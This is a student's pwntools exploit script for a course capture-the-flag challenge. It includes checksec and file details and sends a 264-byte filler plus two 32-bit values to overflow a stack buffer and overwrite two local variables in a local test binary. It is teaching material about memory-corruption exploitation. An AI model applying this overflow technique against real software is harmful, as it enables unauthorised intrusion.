'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     Project 2 --- chall_01
File Description:  Simple buffer overflow, with two args to overwrite into

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   68) Symbols       No    0               1               a.out

File info:
./a.out: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1e2ba83e9de79887ac7819ca1fe4aa3ff49fa409, for GNU/Linux 3.2.0, not stripped
'''

'''
Variable location:

Userinput: var_110
arg2: var_8
arg1: var_4
'''
# Import libraries
from pwn import *

# Craft payload
overwrite_me = 0x1337
overwrite_me2 = 0x69696969
payload=b'a'*264+p32(overwrite_me)+p32(overwrite_me2)

# Starting process
p=process("./a.out")
p.sendline(payload)
p.recv()
p.interactive()